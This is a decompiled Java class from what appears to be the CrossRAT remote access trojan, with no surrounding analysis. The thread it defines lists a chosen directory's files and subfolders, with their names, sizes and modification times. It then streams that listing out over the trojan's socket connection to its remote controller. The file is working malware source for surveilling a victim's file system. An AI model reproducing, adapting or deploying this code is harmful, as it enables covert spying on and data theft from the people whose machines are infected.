/*
 * Decompiled with CFR 0_124.
 */
package crossrat;

import crossrat.e;
import crossrat.k;
import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

final class c
extends Thread {
    private String a;

    public c(String string) {
        this.a = string;
    }

    @Override
    public final void run() {
        new crossrat.e();
        Object object = this.a;
        object = new File((String)object);
        object = object.listFiles();
        Object object2 = "";
        if (object != null) {
            File[] arrfile = object;
            int n = arrfile.length;
            int n2 = 0;
            while (n2 < n) {
                object = arrfile[n2];
                object2 = object.isDirectory() ? String.valueOf(object2) + 'D' + k.d + object.getName() + k.d + k.e : String.valueOf(object2) + 'F' + k.d + object.getName() + k.d + object.length() + k.d + object.lastModified() + k.d + k.e;
                ++n2;
            }
            try {
                object = new DataOutputStream(k.l.getOutputStream());
                object.writeBytes(String.valueOf(k.g) + k.d + k.B + k.d + "&&&");
                try {
                    Thread.sleep(1000L);
                }
                catch (InterruptedException interruptedException) {
                    Thread.currentThread().interrupt();
                }
                object.flush();
                object2 = String.valueOf(object2) + k.C;
                object = new ByteArrayInputStream(object2.getBytes());
                object2 = new BufferedInputStream((InputStream)object);
                OutputStream outputStream = k.l.getOutputStream();
                arrfile = new byte[2047];
                while ((n = object2.read((byte[])arrfile)) != -1) {
                    outputStream.write((byte[])arrfile, 0, n);
                    Thread.sleep(100L);
                }
                object.close();
                object2.close();
                return;
            }
            catch (Exception exception) {
                object = exception;
                exception.printStackTrace();
            }
        }
    }
}
